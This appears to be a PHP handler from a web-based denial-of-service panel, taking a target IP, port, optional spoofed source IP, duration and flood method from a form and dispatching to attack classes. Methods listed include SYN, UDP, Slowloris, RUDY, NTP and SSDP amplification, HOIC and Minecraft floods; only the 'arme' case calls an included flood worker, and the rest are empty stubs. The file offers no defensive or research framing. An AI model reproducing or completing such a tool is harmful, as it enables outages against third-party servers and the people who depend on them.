<?php
include_once "header.php";

	//Number of socket
	if(!empty($_POST['builds'])){
		$socketn = $_POST['builds'];
	}else{$socketn = 100;}
	//Message length
	if(!empty($_POST['lenght'])){
		$lenght = $_POST['lenght'];
	}else{$lenght = 1024;}
	//timeout
	if(!empty($_POST['timedout'])){
		$timedout = $_POST['timedout'];
	}else{$timedout = 30;}
	//Host
	if(!empty($_POST['ip'])){
		$ip = $_POST['ip'];
	}else{
		echo "host is empty!";
		//break;
	}
	//Source IP
	if(!empty($_POST['srcip'])){
		$srcip = $_POST['srcip'];
	}else{$srcip = "";}
	//Method
	if(!empty($_POST['method'])){
		$method = $_POST['method'];  
	}else{
		echo "method is empty!";
		//break;
	}
	//Port
	if(!empty($_POST['port'])){
		$port = $_POST['port']; 
	}else{$port = 80;}
	//Exec Time
	if(!empty($_POST['time'])){
		$exec_time = $_POST['time'];  
	}else{
		echo "exec_time is empty!";
		//break;
	}
	//Thread
	/*if(!empty($_POST['thread'])){
		$thread = $_POST['thread'];   
	}else{$thread = 60;}*/

	


	$packets = 0;
	$starttime = date("Y-m-d H:i:s");
	$max_time = time()+$exec_time;

	

	ignore_user_abort(FALSE); 
	ini_set('max_execution_time', $max_time);

	include_once "../class/attack.php";
	$attack = new attack($socketn, $lenght, $timedout, $ip, $srcip, $port, $max_time);
	
	switch ($method) {
    case "icmp":
        
        break;
    case "smurf":
        
        break;
    case "udp":
        
        break;
    case "tcp":
        
        break;
    case "syn":
		
		break;
	case "get":
		
		break;
	case "post":
		
		break;
	case "slowloris":
		
		break;
	case "arme":
		include_once "../class/flood/arme.php";
    	$worker = new arme($attack->getIp(), $attack->getPort(), $attack->getTimedout(), $attack->getSocketn(), $attack->getMax_time());
    	$packets +=$worker->start();
		echo $packets;
		break;
	case "rudy":
		
		break;
	case "ntpattack":
		
		break;
	case "ssdpattack":
		
		break;
	case "ssl":
		
		break;
	case "minecraftbandwitdh":
		
		break;
	case "hoic": 
		
		break;
	case "":
		echo "404 - Method Not Found";
		break;
	}




?>
